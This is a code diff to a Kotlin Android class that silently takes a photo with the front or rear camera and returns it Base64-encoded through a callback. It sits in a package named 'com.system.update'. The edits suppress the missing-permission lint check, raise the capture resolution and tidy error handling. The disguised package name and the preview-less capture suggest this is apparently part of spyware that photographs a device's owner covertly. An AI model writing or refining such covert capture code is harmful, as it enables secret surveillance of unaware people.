@@ -1,5 +1,6 @@
 package com.system.update
 
+import android.annotation.SuppressLint
 import android.content.Context
 import android.graphics.ImageFormat
 import android.hardware.camera2.*
@@ -17,6 +18,7 @@ class CameraCapture(private val ctx: Context) {
         private const val TAG = "CameraCapture"
     }
 
+    @SuppressLint("MissingPermission")
     fun capture(front: Boolean, callback: (String?) -> Unit) {
         val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
         val targetFacing = if (front) CameraCharacteristics.LENS_FACING_FRONT
@@ -27,7 +29,7 @@ class CameraCapture(private val ctx: Context) {
                 cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == targetFacing
             } ?: cm.cameraIdList.firstOrNull()
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to get camera list", e)
+            Log.e(TAG, "Camera list error", e)
             null
         }
 
@@ -36,13 +38,15 @@ class CameraCapture(private val ctx: Context) {
             return
         }
 
-        val thread = HandlerThread("cam_$cameraId").also { it.start() }
+        val thread = HandlerThread("cam_thread").also { it.start() }
         val handler = Handler(thread.looper)
 
         try {
             val chars = cm.getCameraCharacteristics(cameraId)
             val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
-            val size = map?.getOutputSizes(ImageFormat.JPEG)?.minByOrNull { it.width * it.height }
+            val size = map?.getOutputSizes(ImageFormat.JPEG)
+                ?.filter { it.width <= 1280 && it.height <= 1280 }
+                ?.maxByOrNull { it.width * it.height }
                 ?: Size(640, 480)
 
             val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
@@ -60,10 +64,10 @@ class CameraCapture(private val ctx: Context) {
                         val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                         callback(b64)
                     } catch (e: Exception) {
-                        Log.e(TAG, "Encode failed", e)
+                        Log.e(TAG, "Encode error", e)
                         callback(null)
                     } finally {
-                        image.close()
+                        try { image.close() } catch (_: Exception) {}
                         try { session?.close() } catch (_: Exception) {}
                         try { cameraDevice?.close() } catch (_: Exception) {}
                         try { r.close() } catch (_: Exception) {}
@@ -81,6 +85,7 @@ class CameraCapture(private val ctx: Context) {
                             set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                             set(CaptureRequest.JPEG_QUALITY, 85.toByte())
                         }
+                        @Suppress("DEPRECATION")
                         camera.createCaptureSession(
                             listOf(reader.surface),
                             object : CameraCaptureSession.StateCallback() {
@@ -89,19 +94,19 @@ class CameraCapture(private val ctx: Context) {
                                     try {
                                         s.capture(req.build(), null, handler)
                                     } catch (e: Exception) {
-                                        Log.e(TAG, "Capture failed", e)
+                                        Log.e(TAG, "Capture error", e)
                                         callback(null)
                                     }
                                 }
                                 override fun onConfigureFailed(s: CameraCaptureSession) {
-                                    Log.e(TAG, "Session config failed")
+                                    Log.e(TAG, "Config failed")
                                     callback(null)
                                 }
                             },
                             handler
                         )
                     } catch (e: Exception) {
-                        Log.e(TAG, "Capture request failed", e)
+                        Log.e(TAG, "Request error", e)
                         callback(null)
                     }
                 }
@@ -110,13 +115,13 @@ class CameraCapture(private val ctx: Context) {
                     callback(null)
                 }
                 override fun onError(camera: CameraDevice, error: Int) {
-                    Log.e(TAG, "Camera error: $error")
+                    Log.e(TAG, "Camera error $error")
                     camera.close()
                     callback(null)
                 }
             }, handler)
         } catch (e: Exception) {
-            Log.e(TAG, "Setup failed", e)
+            Log.e(TAG, "Setup error", e)
             callback(null)
         }
     }
